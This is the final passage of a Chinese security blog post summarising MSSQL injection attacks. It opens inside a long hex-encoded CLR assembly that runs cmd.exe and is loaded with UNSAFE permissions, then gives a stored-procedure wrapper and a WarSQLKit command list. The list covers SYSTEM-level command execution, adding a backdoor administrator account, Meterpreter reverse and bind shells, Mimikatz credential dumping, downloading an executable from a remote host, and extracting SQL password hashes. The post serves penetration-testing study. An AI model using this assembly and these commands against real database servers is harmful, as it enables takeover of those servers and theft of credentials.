01E4010E000302A7020E00D200A7020E004102A70206001402400006002102400006003100E401000000003700000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000002700000002000000000000000000000070005F000000000002000000000000000000000070004A00000000000200000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A002000000094D7820A71E9194C88B33EF48E77E58C000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F77730108010007010000000004010000000000000000011E7D6700000000020000001C010000E42A0000E40C00005253445334091CBA9FE9494799C5062AA03FA26201000000453A5C53514C20536572766572E9A1B9E79BAE5C4461746162617365315C4461746162617365315C6F626A5C44656275675C4461746162617365312E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000004400610074006100620061007300650031002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004400610074006100620061007300650031002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">WITH PERMISSION_SET = UNSAFE</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_cmdExec</span><br><span class="line">@Command [nvarchar](4000)</span><br><span class="line">WITH EXECUTE AS CALLER</span><br><span class="line">AS</span><br><span class="line">EXTERNAL NAME Database1.StoredProcedures.CmdExec</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
<p>支持的命令：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;whoami&#x27;; =&gt; Any Windows command</span><br><span class="line">EXEC sp_cmdExec &#x27;whoami /RunSystemPriv&#x27;; =&gt; Any Windows command with NT AUTHORITY\SYSTEM rights</span><br><span class="line">EXEC sp_cmdExec &#x27;&quot;net user eyup P@ssw0rd1 /add&quot; /RunSystemPriv&#x27;; =&gt; Adding users with RottenPotato (Kumpir)</span><br><span class="line">EXEC sp_cmdExec &#x27;&quot;net localgroup administrators eyup /add&quot; /RunSystemPriv&#x27;; =&gt; Adding user to localgroup with RottenPotato (Kumpir)</span><br><span class="line">EXEC sp_cmdExec &#x27;powershell Get-ChildItem /RunSystemPS&#x27;; =&gt; (Powershell) with RottenPotato (Kumpir)</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_reverse_tcp LHOST LPORT GetSystem&#x27;; =&gt; x86 Meterpreter Reverse Connection with  NT AUTHORITY\SYSTEM</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem&#x27;; =&gt; x64 Meterpreter Reverse Connection with  NT AUTHORITY\SYSTEM</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem&#x27;; =&gt; x86 Meterpreter Reverse Connection RC4 with  NT AUTHORITY\SYSTEM, RC4PASSWORD=warsql</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_bind_tcp LPORT GetSystem&#x27;; =&gt; x86 Meterpreter Bind Connection with  NT AUTHORITY\SYSTEM</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_Mimikatz&#x27;; </span><br><span class="line">select * from WarSQLKitTemp =&gt; Get Mimikatz Log. Thnks Benjamin Delpy :)</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_downloadFile http://eyupcelik.com.tr/file.exe C:\ProgramData\file.exe 300&#x27;;  =&gt; Download File</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_getSqlHash&#x27;;  =&gt; Get MSSQL Hash</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_getProduct&#x27;;  =&gt; Get Windows Product</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_getDatabases&#x27;;  =&gt; Get Available Database</span><br></pre></td></tr></table></figure></p>
<p>但是他只支持.net4.0+,也就是MSSQL2012以上的版本</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2204665">干货 | MSSQL注入和漏洞利用姿势总结-腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7534">https://xz.aliyun.com/t/7534</a></li>
<li><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/465370.html#909134e16br5h">https://help.aliyun.com/document_detail/465370.html#909134e16br5h</a></li>
<li><a target="_blank" rel="noopener" href="https://eyupcelik.com.tr/mssql-fileless-rootkit-warsqlkit/">MSSQL 无文件 Rootkit – MSSQL 攻击工具 – WarSQLKit eyüp Çelik // 高级网络安全专家</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit">GitHub - mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit：WarSQLKit 是我为 MS-SQL 开发的无文件 Rootkit 和攻击工具。使用此工具，您可以对在 MS-SQL 服务器上使用 CLR 的 SQL 服务进行 rootkit。因此，可以在 SQL 服务的进程内存中执行恶意代码，而不会产生恶意函数</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Jmx0hxq</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/07/sqlserver%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">http://example.com/2025/01/07/sqlserver%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">jmx0hxq's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0/">学习</a></div><div class="post_share"><div class="social-share" data-image="/assets/images/4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/01/03/Spring%20Cloud%20Gateway%20RCE%E5%92%8CSSRF%E6%98%A0%E5%B0%84%E5%86%85%E7%BD%91/" title="Spring Cloud Gateway RCE和SSRF映射内网"><img class="cover" src="/assets/images/3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Spring Cloud Gateway RCE和SSRF映射内网</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/01/03/Spring%20Cloud%20Gateway%20RCE%E5%92%8CSSRF%E6%98%A0%E5%B0%84%E5%86%85%E7%BD%91/" title="Spring Cloud Gateway RCE和SSRF映射内网"><img class="cover" src="/assets/images/3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-03</div><div class="title">Spring Cloud Gateway RCE和SSRF映射内网</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/jmx0hxq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jmx0hxq</div><div class="author-info__description">总有人间一两风,填我十万八千梦</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/jmx0hxq" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:3077959912@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.2.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.4.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">4.</span> <span class="toc-text">攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-cmdshell"><span class="toc-number">4.1.</span> <span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp-cmdshell%E8%A2%AB%E5%88%A0%E4%BA%86%E5%A6%82%E4%BD%95%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">xp_cmdshell被删了如何攻击?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-oacreate"><span class="toc-number">4.2.1.</span> <span class="toc-text">sp_oacreate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR"><span class="toc-number">4.2.2.</span> <span class="toc-text">CLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WarSQLKit"><span class="toc-number">4.2.3.</span> <span class="toc-text">WarSQLKit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.2.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/07/sqlserver%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="MSSQL注入攻击总结"><img src="/assets/images/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MSSQL注入攻击总结"/></a><div class="content"><a class="title" href="/2025/01/07/sqlserver%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" title="MSSQL注入攻击总结">MSSQL注入攻击总结</a><time datetime="2025-01-07T12:43:37.814Z" title="发表于 2025-01-07 20:43:37">2025-01-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/03/Spring%20Cloud%20Gateway%20RCE%E5%92%8CSSRF%E6%98%A0%E5%B0%84%E5%86%85%E7%BD%91/" title="Spring Cloud Gateway RCE和SSRF映射内网"><img src="/assets/images/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring Cloud Gateway RCE和SSRF映射内网"/></a><div class="content"><a class="title" href="/2025/01/03/Spring%20Cloud%20Gateway%20RCE%E5%92%8CSSRF%E6%98%A0%E5%B0%84%E5%86%85%E7%BD%91/" title="Spring Cloud Gateway RCE和SSRF映射内网">Spring Cloud Gateway RCE和SSRF映射内网</a><time datetime="2025-01-03T15:20:00.551Z" title="发表于 2025-01-03 23:20:00">2025-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/07/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/" title="红日靶场1学习记录"><img src="/assets/images/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场1学习记录"/></a><div class="content"><a class="title" href="/2024/12/07/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/" title="红日靶场1学习记录">红日靶场1学习记录</a><time datetime="2024-12-07T09:55:02.369Z" title="发表于 2024-12-07 17:55:02">2024-12-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/01/2024%20SCTF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" title="2024SCTF出题记录"><img src="/assets/images/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024SCTF出题记录"/></a><div class="content"><a class="title" href="/2024/10/01/2024%20SCTF%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/" title="2024SCTF出题记录">2024SCTF出题记录</a><time datetime="2024-09-30T17:23:49.277Z" title="发表于 2024-10-01 01:23:49">2024-10-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/31/2024%E4%BA%AC%E9%BA%92CTF%20ezldap%E5%A4%8D%E7%8E%B0/" title="2024京麒CTF ezldap复现分析"><img src="/assets/sbpk/18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024京麒CTF ezldap复现分析"/></a><div class="content"><a class="title" href="/2024/05/31/2024%E4%BA%AC%E9%BA%92CTF%20ezldap%E5%A4%8D%E7%8E%B0/" title="2024京麒CTF ezldap复现分析">2024京麒CTF ezldap复现分析</a><time datetime="2024-05-31T09:25:28.479Z" title="发表于 2024-05-31 17:25:28">2024-05-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Jmx0hxq</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer" data-id="1419123454" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>